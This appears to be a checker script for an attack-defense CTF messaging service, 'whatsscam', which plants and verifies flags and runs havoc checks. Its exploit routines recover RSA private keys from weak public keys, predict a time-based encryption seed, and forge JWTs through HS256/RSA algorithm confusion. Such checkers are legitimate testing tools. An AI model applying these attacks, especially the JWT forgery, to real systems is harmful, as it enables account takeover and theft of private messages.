from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
#import faker

import httpx
from httpx import AsyncClient
from typing import Optional
from logging import LoggerAdapter
from bs4 import BeautifulSoup
import re
import datetime


import checker_util_func
import scam_messages
from Crypto.Cipher import AES
import rsa
import base64
from Crypto.Util.Padding import pad, unpad

#exploit 3
from Crypto.PublicKey import RSA
from Crypto.Hash import HMAC, SHA256

from httpx import ConnectTimeout, NetworkError, PoolTimeout




from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""
SERVICE_PORT = 9696
checker = Enochecker("whatsscam", 9696)
def app(): return checker.app


"""
CHECKER FUNCTIONS 0
"""
@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:

    try:
        email_1, password1_1 = await checker_util_func.create_user(client, logger, public_key='on')
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except Exception:
        raise MumbleException("Could not create user 1")
    
    try:
        await checker_util_func.logout(client, logger)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not logout")

    try:
        email_2, password1_2 = await checker_util_func.create_user(client, logger, public_key=None)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create user 2")

    try:
        public_key = await checker_util_func.get_user_of_userlist(client, logger, email = email_1)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not get public key")


    message = str(task.flag)
    try:
        await checker_util_func.create_message(client, logger, message, public_key)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create message")
    
    try:
        await db.set("user_data_0", (email_2, password1_2))
    except:
        raise MumbleException("Could not set userdata")

    return email_1


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:
    
    try:
        email, password = await db.get("user_data_0")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    
    try:
        await checker_util_func.login_user(client, logger, email, password)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not login user")
    
    try:
        await checker_util_func.get_message( client, logger, message = str(task.flag))
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not get message")

@checker.exploit(0)
async def exploit_test(
    task: ExploitCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
) -> None:
    if "@example.com" in task.attack_info:
        logger.info("attack_info is good")
    else:
        return None
    start_time = datetime.datetime.now()

    target_email = task.attack_info
    try:
        email_attacker, password = await checker_util_func.create_user(client, logger, public_key= None)
    except:
        raise MumbleException("Could not create user 3")
        
    try:
        public_key = await checker_util_func.get_user_of_userlist(client, logger, email = target_email)
    except:
        raise MumbleException("Could not get public key")
    
    try:
        public_key = checker_util_func.format_rsa_public_key(public_key)
    except:
        raise MumbleException("Could not format public key")
    
    key = rsa.PublicKey.load_pkcs1(public_key.encode())
    try:
        private_key = checker_util_func.expprime(key)
    except:
        raise MumbleException("Could not create private key")
    
    private_key = private_key.save_pkcs1().decode()

    try:
        get_all_messages = await checker_util_func.get_all_messages(client, logger)
    except:
        raise MumbleException("Could not get all messages")
    
    soup_html = get_all_messages #BeautifulSoup(get_all_messages, "html.parser")
    li = soup_html.find_all("li")
    li = [x.text for x in li]
    li = [x.split(" ") for x in li]
    li = [x.strip() for sublist in li for x in sublist]
    li = [x for x in li if x != '']

    for i in range(0, 2):
        start_time11 = datetime.datetime.now()
        for i in li:
            try:
                decrypted_message = checker_util_func.decryption_of_message(i, private_key)
                if flag := searcher.search_flag(decrypted_message):
                    end_time = datetime.datetime.now()
                    return flag
            except:
                pass
    raise MumbleException("flag not found")

@checker.putnoise(0)
async def putnoise0(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,    
    logger: LoggerAdapter
) -> None:
    
    try:
        email_1, password1_1 = await checker_util_func.create_user(client, logger, public_key='on')
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create user 1")

    try:
        private_key = await checker_util_func.get_private_key(client, logger)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not get private key")

    try:
        await checker_util_func.logout(client, logger)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not logout")

    try:
        email_2, password1_2 = await checker_util_func.create_user(client, logger, public_key=None)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create user 2")

    try:
        public_key = await checker_util_func.get_user_of_userlist(client, logger, email = email_1)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not get public key")

    random.seed(random.SystemRandom().random())
    randomNumber = random.randint(10, 1000)
    randommessage = "".join(random.choices(string.ascii_letters + string.digits, k=randomNumber))

    try:
        await checker_util_func.create_message(client, logger, randommessage, public_key)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create message")

    try:
        time = await checker_util_func.get_message_time0(client, logger, message = randommessage, dir = "/")
        print(time)
        print("das ist auch die zeit")
        if time == None:
            raise MumbleException("Could not get message time")
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not get message time")
    
    try:
        await db.set("user_data_0_noise", (email_2, password1_2, randommessage, time, private_key))
    except:
        raise MumbleException("Could not set userdata")
    
@checker.getnoise(0)
async def getnoise0(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:
    try:
        email, password, message, time, private_key = await db.get("user_data_0_noise")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    
    try:
        await checker_util_func.login_user(client, logger, email, password)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not login user")

    try:
        await checker_util_func.get_message(client, logger, message = str(message))
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not get message")

    try:
        await checker_util_func.logout(client, logger)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not logout")

    try:
        email_2, password1_2 = await checker_util_func.create_user(client, logger, public_key=None)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create user")

    try:
        boolean = await checker_util_func.time_correct0(client, logger, time, dir = "/")
        if not boolean:
            raise MumbleException("Time is not correct or encrypted message is not there")
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not check time")

    try:
        boolean = await checker_util_func.try_private_key(client, logger, private_key, str(message))
        if not boolean:
            raise MumbleException("Could not use private key")
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not use private key")
    

"""
CHECKER FUNCTIONS 1
"""

@checker.putflag(1)
async def putflag_test_1(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    try:
        email_1, password1_1 = await checker_util_func.create_user(client, logger, public_key=None)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create user 1")

    try:
        group_name, group_key, redirect_url = await checker_util_func.create_group(client, logger)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create Group")
    group_id = str(redirect_url).split('/')[-1]

    try:
        await checker_util_func.create_group_message(client, logger, message = task.flag, redirect_url = redirect_url)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create group message")

    try:
        await db.set("group_data_1", (group_name, group_key, group_id))
    except:
        raise MumbleException("Could not set group data")
    
    return group_id


@checker.getflag(1)
async def getflag_test_1(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    try:
        group_name, group_key, group_id = await db.get("group_data_1")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    
    try:
        await checker_util_func.create_user(client, logger, public_key=None)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create user")

    try:
        await checker_util_func.join_group(client, logger, group_name, group_key, group_id)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not join group")

    try:
        await checker_util_func.get_group_message(client, logger, group_name, group_key, group_id, message = task.flag)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not get group message")
    

@checker.exploit(1)
async def exploit_test_1(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
) -> None:
    if "@example.com" not in task.attack_info:
        logger.info("attack_info is good")
    else:
        return None

    target_email = task.attack_info
    try:
        email_attacker, password = await checker_util_func.create_user(client, logger, public_key= None)
    except:
        raise MumbleException("Could not create user 3")
    try:
        response = await checker_util_func.open_group_window(client, logger, task.attack_info)
    except:
        raise MumbleException("Could not open group window")

    soup_html = BeautifulSoup(response.text, "html.parser")
    li = soup_html.find_all("li")
    li = [x.text for x in li]
    li = [x.split(" ") for x in li]
    li = [x.strip() for sublist in li for x in sublist]
    li = [x for x in li if x != '']
    
    cipher = li[0]
    time = li[2]
    seed = str(int(time.split(":")[0]) + 2) + time.split(":")[1]
    try:
        flag = await checker_util_func.exploit2(client, logger, cipher, str(seed), searcher)
    except:
        raise MumbleException("Could not exploit")
    
    return flag

@checker.putnoise(1)
async def putnoise1(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter
) -> None:
    try:
        email_1, password1_1 = await checker_util_func.create_user(client, logger, public_key=None)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create user 1")

    try:
        group_name, group_key, redirect_url = await checker_util_func.create_group(client, logger)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create Group")
    group_id = str(redirect_url).split('/')[-1]
    random.seed(random.SystemRandom().random())
    randomNumber = random.randint(10, 1000)
    randommessage = "".join(random.choices(string.ascii_letters + string.digits, k=randomNumber))

    try:
        await checker_util_func.create_group_message( client, logger, message = randommessage, redirect_url = redirect_url)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create group message")

    try:
        time_db = await checker_util_func.get_message_time1(client, logger, message = randommessage, dir= redirect_url)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not get message time")
    
    try:
        await db.set("group_data_1_noise", (group_name, group_key, group_id, randommessage, time_db))
    except:
        raise MumbleException("Could not set group data")
    

@checker.getnoise(1)
async def getnoise1(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:
    try:
        group_name, group_key, group_id, randommessage, time = await db.get("group_data_1_noise")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    try:
        await checker_util_func.create_user(client, logger, public_key=None)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create user")

    try:
        await checker_util_func.join_group(client, logger, group_name, group_key, group_id)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not join group")

    try:
        await checker_util_func.get_group_message(client, logger, group_name, group_key, group_id, message = randommessage)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not get group message")

    try:
        await checker_util_func.logout(client, logger)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not logout")

    try:
        await checker_util_func.create_user(client, logger, public_key=None)
    except (ConnectTimeout, NetworkError, PoolTimeout) as e:
        raise OfflineException(f"Offline due to: {str(e)}") from e
    except:
        raise MumbleException("Could not create user")
    
    try:
        url = "/creategroup/" + group_id
        boolean = await checker_util_func.time_correct1(client, logger, time, dir = url)
        if not boolean:
            raise MumbleException("Time is not correct or encrypted message is not there")
    except:
        raise MumbleException("Could not check time")
    
    # try:
    #     response = await checker_util_func.open_group_window(client, logger, group_id)
    # except:
    #     raise MumbleException("Could not open group window")

    # try:
    #     bool = await checker_util_func.decrypt_aes(client, logger, response, key, nonce, randommessage, response)
    #     if not bool:
    #         raise MumbleException("Could not decrypt aes or encrypted message is not there")
    # except:
    #     raise MumbleException("Could not decrypt aes or encrypted message is not there")

"""
CHECKER FUNCTIONS 2
"""

@checker.putflag(2)
async def putflag_test_2(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    try:
        email_1, password1_1 = await checker_util_func.create_user_backup(client, logger, public_key=None)
    except:
        raise MumbleException("Could not create user 1")
    try:
        response = await checker_util_func.profile(client, logger)
    except:
        raise MumbleException("Could not get profile")
    try:
        status = task.flag
        await checker_util_func.profile_change_status(client, logger, status)
    except:
        raise MumbleException("Could not change status")
    try:
        response = await checker_util_func.get_token(client, logger)
    except:
        raise MumbleException("Could not get token")
    soup = BeautifulSoup(response.text, "html.parser")
    messages = soup.find_all('li', class_='list-group-item')
    messages = [message.text for message in messages]
    single_string = ''.join(messages)
    token = single_string.split("Your Token: ")
    token = token[1]
    try:
        await db.set("user_data_2", (email_1, password1_1, token))
    except:
        raise MumbleException("Could not set userdata")

    return email_1

@checker.getflag(2)
async def getflag_test_2(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    try:
        email, password, token = await db.get("user_data_2")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    try:
        response = await checker_util_func.get_token_from_backup(client, logger, email, token)
    except:
        raise MumbleException("Could not get token from backup")
    assert_in(task.flag, response.text, "Flag not found in response")
    
@checker.exploit(2)
async def exploit_test_2(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
) -> None:
    if "@scam.com" in task.attack_info:
        logger.info("attack_info is good")
    else:
        return None
    email = task.attack_info


    try:
        email_attacker, password = await checker_util_func.create_user(client, logger, public_key= None)
    except:
        raise MumbleException("Could not create user 3")
    try:
        public_key = await checker_util_func.get_user_of_userlist(client, logger, email = email)
    except:
        raise MumbleException("Could not get public key")
    public_key = checker_util_func.format_rsa_public_key(public_key)
    public_key = public_key + "\n"
    PUBKEY = RSA.import_key(public_key)
    PUBKEY = PUBKEY.public_key().export_key(format='PEM')


    b64 = lambda x:base64.urlsafe_b64encode(x).replace(b'=',b'')
    payload = b64(b'{"alg":"HS256"}') + b'.' + b64(f'{{"email":"{email}"}}'.encode('utf-8'))
    hasher = HMAC.new(PUBKEY, digestmod=SHA256)
    hasher.update(payload)
    evil_token = payload + b'.' + b64(hasher.digest())
    evil_token = evil_token.decode()
    try:
        response = await checker_util_func.get_token_from_backup(client, logger, email, evil_token)
    except:
        raise MumbleException("Could not get token from backup")
    if flag := searcher.search_flag(response.text):
        return flag

#to be changed but for now it is just a placeholder so at the ctf we it doesnt crash
@checker.putnoise(2)
async def putnoise2(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,    
    logger: LoggerAdapter
) -> None:
    something = "something"
    try:
        await db.set("data_noise", (something))
    except:
        raise MumbleException("Could not set group data")

@checker.getnoise(2)
async def getnoise2(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:
    try:
        something = await db.get("data_noise")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")


"""
CHECKER FUNCTION Havoc
"""

@checker.havoc(0)
async def havoc_0(
    task: HavocCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:
    try:
        email_1, password1_1 = await checker_util_func.create_user(client, logger, public_key=None)
    except:
        raise MumbleException("Could not create user 1")
    try:
        response = await checker_util_func.profile(client, logger)
    except:
        raise MumbleException("Could not get profile")
    try:
        status = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        await checker_util_func.profile_change_status(client, logger, status)
    except:
        raise MumbleException("Could not change status")
    try:
        await checker_util_func.profile_get_private_key(client, logger)
    except:
        raise MumbleException("Could not get private key")
    #new
    try:
        await checker_util_func.logout(client, logger)
    except:
        raise MumbleException("Could not logout")
    
    #accept friend request
    try:
        email_2, password1_2 = await checker_util_func.create_user(client, logger, public_key=None)
    except:
        raise MumbleException("Could not create user 2")

    try:
        await checker_util_func.add_friend(client, logger, email_1)
    except:
        raise MumbleException("Could not add friend")
    
    try:
        await checker_util_func.logout(client, logger)
    except:
        raise MumbleException("Could not logout")
    
    #reject friend request
    try:
        email_3, password1_3 = await checker_util_func.create_user(client, logger, public_key=None)
    except:
        raise MumbleException("Could not create user 3")
    
    try:
        await checker_util_func.add_friend(client, logger, email_1)
    except:
        raise MumbleException("Could not add friend")
    
    try:
        await checker_util_func.logout(client, logger)
    except:
        raise MumbleException("Could not logout")
    
    #now do it
    try:
        await checker_util_func.login_user(client, logger, email_1, password1_1)
    except:
        raise MumbleException("Could not login user")
    
    try:
        await checker_util_func.accept_friend(client, logger, email_2)
    except:
        raise MumbleException("Could not accept friend")
    
    try:
        await checker_util_func.reject_friend(client, logger, email_3)
    except:
        raise MumbleException("Could not reject friend")
    
    try:
        bool = await checker_util_func.event(client, logger)
        if not bool:
            raise MumbleException("Could not get correct link")
    except:
        raise MumbleException("Could not get event")

#for the scam theme -> messages for private messages
@checker.havoc(1)
async def havoc_1(
    task: HavocCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:
    try:
        email_1, password1_1 = await checker_util_func.create_user(client, logger, public_key=None)
    except:
        raise MumbleException("Could not create user 1")
    for i in range(0, 20):
        message = scam_messages.get_scam_message()
        try:
            response = await checker_util_func.create_message(client, logger, message, None)
        except:
            raise MumbleException("Could not create message")
    
    
if __name__ == "__main__":
    checker.run()